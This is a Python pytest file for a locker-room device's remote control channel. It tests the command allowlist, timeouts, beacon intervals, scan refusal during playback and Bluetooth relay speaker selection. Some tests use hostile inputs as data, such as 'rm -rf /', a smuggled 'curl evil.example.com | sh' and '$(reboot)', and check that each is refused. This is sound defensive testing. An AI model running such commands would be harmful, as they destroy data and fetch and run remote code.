"""The allowlist is the only thing standing between this control channel and
remote code execution on a device in a locker room. Test it as such."""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import lockerroom.control as control  # noqa: E402


def test_unknown_command_is_refused_without_executing(monkeypatch):
    called = []
    monkeypatch.setattr(control.subprocess, "run", lambda *a, **k: called.append(a))

    ok, output = control._run("rm -rf /")

    assert ok is False
    assert "not an allowed command" in output
    assert called == [], "a command outside the allowlist must never reach subprocess"


def test_shell_metacharacters_do_not_smuggle_a_second_command(monkeypatch):
    called = []
    monkeypatch.setattr(control.subprocess, "run", lambda *a, **k: called.append(a))

    # Lookup is by exact key, so appending to a valid name does not match.
    ok, output = control._run("report-status; curl evil.example.com | sh")

    assert ok is False
    assert called == []


def test_allowed_command_runs_as_a_fixed_argv(monkeypatch):
    seen = {}

    class Result:
        returncode = 0
        stdout = "up 4 minutes"
        stderr = ""

    def fake_run(argv, **kwargs):
        seen["argv"] = argv
        return Result()

    monkeypatch.setattr(control.subprocess, "run", fake_run)

    ok, output = control._run("restart-listener")

    assert ok is True
    # A list, never a shell string - nothing here is parsed by a shell.
    assert seen["argv"] == ["sudo", "systemctl", "restart", "lockerroom-listener"]
    assert isinstance(seen["argv"], list)


def test_command_failure_is_reported_not_raised(monkeypatch):
    def boom(*a, **k):
        raise OSError("no such binary")

    monkeypatch.setattr(control.subprocess, "run", boom)

    ok, output = control._run("reboot")

    # A failing command must not kill the beacon loop - that would strand the
    # Pi with no way to receive the next command.
    assert ok is False
    assert "OSError" in output


# --------------------------------------------------------------------------- #
# Per-command timeouts. One slow command must not set the timeout for all of
# them: a 15s Bluetooth sweep plus a per-device info call each does not fit in
# the 25s that was fine for `uptime`.
# --------------------------------------------------------------------------- #

import pytest  # noqa: E402

from lockerroom import btscan, relaytarget  # noqa: E402


def _fake_run(seen, stdout="", rc=0):
    class Result:
        returncode = rc
        stderr = ""

    Result.stdout = stdout

    def run(argv, **kwargs):
        seen["argv"] = argv
        seen["timeout"] = kwargs.get("timeout")
        return Result()

    return run


def test_each_command_carries_its_own_timeout(monkeypatch):
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
    control._run("report-status")
    quick = seen["timeout"]
    control._run("scan-speakers")
    assert seen["timeout"] > quick, "a Bluetooth sweep needs longer than uptime"


def test_the_scan_command_is_a_fixed_argv_with_no_arguments(monkeypatch):
    """The one thing that must stay true of every entry on this list. A scan
    takes no parameters, which is exactly why it can be a command at all —
    selecting a speaker is state, and travels on the beacon instead."""
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen))
    control._run("scan-speakers")
    assert seen["argv"] == ["sudo", "/usr/local/bin/bt-scan.sh"]


def test_every_allowlisted_entry_is_an_argv_list_and_a_timeout():
    for name, (argv, timeout) in control.ALLOWED.items():
        assert isinstance(argv, list), f"{name} must be an argv list, not a shell string"
        assert all(isinstance(a, str) for a in argv), name
        assert isinstance(timeout, (int, float)) and timeout > 0, name


def test_no_allowlisted_command_interpolates_anything():
    """If a command ever needs a parameter, it does not belong on this list —
    see the speaker selection design. Nothing here may contain a placeholder."""
    for name, (argv, _) in control.ALLOWED.items():
        for arg in argv:
            assert "{" not in arg and "%s" not in arg, f"{name} looks parameterised"


# --------------------------------------------------------------------------- #
# Attentive mode: the beacon idles at 60s, which is longer than a speaker's
# pairing window. After a command it pays attention for a few minutes.
# --------------------------------------------------------------------------- #


class TestAttentive:
    def test_idle_uses_the_slow_interval(self):
        assert control.next_interval(None, playing=False, now=100.0) == control.IDLE_INTERVAL_S

    def test_playing_uses_the_active_interval(self):
        assert control.next_interval(None, playing=True, now=100.0) == control.ACTIVE_INTERVAL_S

    def test_inside_the_window_is_fast(self):
        assert control.next_interval(200.0, playing=False, now=100.0) == control.ATTENTIVE_INTERVAL_S

    def test_attentive_beats_active(self):
        """Someone is standing at the admin screen holding a speaker. That
        outranks the ten-second cadence a playing song would otherwise get."""
        assert control.next_interval(200.0, playing=True, now=100.0) == control.ATTENTIVE_INTERVAL_S

    def test_the_window_expires_back_to_idle(self):
        assert control.next_interval(100.0, playing=False, now=100.1) == control.IDLE_INTERVAL_S

    def test_a_command_opens_the_window(self):
        assert control.attentive_until(now=1000.0) == 1000.0 + control.ATTENTIVE_WINDOW_S


# --------------------------------------------------------------------------- #
# Reading what the audio arbiter actually selected.
# --------------------------------------------------------------------------- #


class TestReadOutput:
    def test_reads_the_kind_and_the_card(self, tmp_path):
        p = tmp_path / "audio-out"
        p.write_text("usb:Device\n")
        assert control.read_output(p) == {"kind": "usb", "card": "Device"}

    def test_a_relay_card_keeps_the_colons_in_its_mac(self, tmp_path):
        p = tmp_path / "audio-out"
        p.write_text("relay:78:66:F3:1C:9D:B6\n")
        assert control.read_output(p) == {
            "kind": "relay",
            "card": "78:66:F3:1C:9D:B6",
        }

    def test_a_missing_file_is_unknown_not_an_error(self, tmp_path):
        """The listener may beacon before audio-route.sh has ever run."""
        assert control.read_output(tmp_path / "nope") is None

    def test_garbage_is_unknown(self, tmp_path):
        p = tmp_path / "audio-out"
        p.write_text("nonsense\n")
        assert control.read_output(p) is None


# --------------------------------------------------------------------------- #
# Scanning is refused mid-song. Discovery shares one antenna with the phone's
# audio and the outbound relay; pressing Scan during a song must not stutter
# the room. Refused HERE, where the play state actually lives, not guessed at
# on the server.
# --------------------------------------------------------------------------- #


class FakeSessions:
    def __init__(self, open_play=None):
        self._open = open_play

    def open_play_state(self):
        return self._open

    def aux_state(self):
        return None


class TestScanRefusal:
    def test_refused_while_a_play_is_open(self):
        ok, msg = control.may_scan(FakeSessions({"id": "p1", "status": "playing"}))
        assert ok is False
        assert "playing" in msg.lower()

    def test_allowed_when_nothing_is_playing(self):
        assert control.may_scan(FakeSessions(None))[0] is True

    def test_allowed_when_there_are_no_sessions_at_all(self):
        assert control.may_scan(None)[0] is True

    def test_a_session_manager_that_raises_does_not_block_the_scan(self):
        """Failing open is right here: the cost of scanning during a song is a
        stutter, and the cost of never scanning is a feature that does not
        work. A broken read must not be the thing that decides."""

        class Boom:
            def open_play_state(self):
                raise RuntimeError("nope")

        assert control.may_scan(Boom())[0] is True


# --------------------------------------------------------------------------- #
# Applying the speaker the server chose.
# --------------------------------------------------------------------------- #


class FakeRelay:
    def __init__(self, target=None):
        self._target = target
        self.calls: list = []
        self.connected = False
        self.last_error = None

    @property
    def target(self):
        return self._target

    async def set_target(self, mac):
        self.calls.append(mac)
        self._target = mac
        self.connected = mac is not None
        return True


class TestApplyRelaySpeaker:
    @pytest.mark.asyncio
    async def test_a_mac_from_the_server_is_applied_and_cached(self, tmp_path):
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay()
        await control.apply_relay_speaker(
            relay, "78:66:f3:1c:9d:b6", cache_path=cache, configured=None
        )
        assert relay.calls == ["78:66:F3:1C:9D:B6"]
        assert relaytarget.read_cache(cache) == "78:66:F3:1C:9D:B6"

    @pytest.mark.asyncio
    async def test_an_explicit_clear_falls_back_to_wired_and_is_remembered(self, tmp_path):
        """It has to be remembered, or a reboot with no network would read
        config.toml and quietly turn the speaker back on."""
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, "", cache_path=cache, configured="78:66:F3:1C:9D:B6"
        )
        assert relay.calls == [None]
        assert relaytarget.read_cache(cache) == ""

    @pytest.mark.asyncio
    async def test_no_opinion_from_the_server_changes_nothing(self, tmp_path):
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, None, cache_path=cache, configured=None
        )
        assert relay.calls == []
        assert not cache.exists()

    @pytest.mark.asyncio
    async def test_the_same_mac_again_is_not_reapplied(self, tmp_path):
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, "78:66:F3:1C:9D:B6", cache_path=cache, configured=None
        )
        assert relay.calls == []

    @pytest.mark.asyncio
    async def test_a_garbage_mac_is_refused_without_disturbing_the_live_one(self, tmp_path):
        """The server is not trusted to be the only gate — the same stance the
        command allowlist takes, and for the same reason."""
        cache = tmp_path / "relay-target-mac"
        relay = FakeRelay("78:66:F3:1C:9D:B6")
        await control.apply_relay_speaker(
            relay, "$(reboot)", cache_path=cache, configured=None
        )
        assert relay.calls == []
        assert relay.target == "78:66:F3:1C:9D:B6"
        assert not cache.exists()

    @pytest.mark.asyncio
    async def test_a_relay_that_raises_does_not_kill_the_beacon(self, tmp_path):
        class Boom(FakeRelay):
            async def set_target(self, mac):
                raise RuntimeError("bluetoothctl went missing")

        await control.apply_relay_speaker(
            Boom(), "78:66:F3:1C:9D:B6", cache_path=tmp_path / "c", configured=None
        )


# --------------------------------------------------------------------------- #
# The scan result becomes structured beacon payload, not a truncated string.
# --------------------------------------------------------------------------- #


def test_a_scan_result_is_parsed_into_devices_and_summarised(monkeypatch):
    line = "78:66:F3:1C:9D:B6\t0x240414\t-54\tJBL Charge 6"
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen, stdout=line))

    ok, summary, devices = control.run_command("scan-speakers")

    assert ok is True
    assert devices == btscan.parse(line)
    assert "1 device" in summary, "the command history row needs to read sensibly"


def test_a_non_scan_command_returns_no_devices(monkeypatch):
    seen = {}
    monkeypatch.setattr(control.subprocess, "run", _fake_run(seen, stdout="up 4 minutes"))
    ok, summary, devices = control.run_command("report-status")
    assert devices is None
    assert summary == "up 4 minutes"


# --------------------------------------------------------------------------- #
# The beacon skips its wait when it has something to report — but ONLY when the
# last beacon actually got through. Skipping on a failed beacon turns a network
# outage into a tight loop that hammers a dead link with no sleep between
# tries, on a box whose whole job is to survive outages quietly.
# --------------------------------------------------------------------------- #


class TestReportPromptly:
    def test_reports_at_once_when_the_beacon_got_through(self):
        assert control.should_report_now(pending=True, beacon_ok=True) is True

    def test_waits_when_there_is_nothing_to_report(self):
        assert control.should_report_now(pending=False, beacon_ok=True) is False

    def test_backs_off_when_the_beacon_failed(self):
        """The result is still pending and will go up on the next attempt. What
        must not happen is retrying with no delay."""
        assert control.should_report_now(pending=True, beacon_ok=False) is False
